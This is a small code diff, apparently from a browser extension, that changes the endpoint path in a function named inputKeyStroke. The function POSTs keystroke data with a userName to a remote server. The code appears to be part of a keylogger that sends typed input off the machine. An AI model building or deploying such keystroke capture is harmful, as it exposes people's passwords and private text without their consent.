@@ -14,7 +14,7 @@ function inputKeyStroke(mensaje,sender,sendResponse){
             //console.log(mensaje);
 
             var requestKey = new XMLHttpRequest();
-            requestKey.open("POST", urlServer+"/key", true);
+            requestKey.open("POST", urlServer+"key", true);
             requestKey.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
             requestKey.send(JSON.stringify({
                     "userName": user,
